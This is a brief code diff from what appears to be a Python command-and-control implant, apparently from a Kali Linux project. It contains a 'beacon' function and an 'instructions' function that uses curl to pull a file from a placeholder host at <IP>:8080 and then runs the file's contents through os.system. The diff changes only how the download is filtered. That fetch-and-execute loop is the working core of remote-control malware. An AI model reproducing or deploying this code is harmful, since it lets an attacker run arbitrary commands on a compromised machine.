@@ -44,7 +44,7 @@ def beacon():
 	starttime = time.time()
 
 def instructions():
-	os.system('curl <IP>:8080/instructions.txt | cut -d "\'" -f2 > response.txt')
+	os.system('curl <IP>:8080/instructions.txt > response.txt')
 	with open('/home/kali/project/webserver/response.txt') as input_file:
 		contents = input_file.read()
 		os.system(contents)
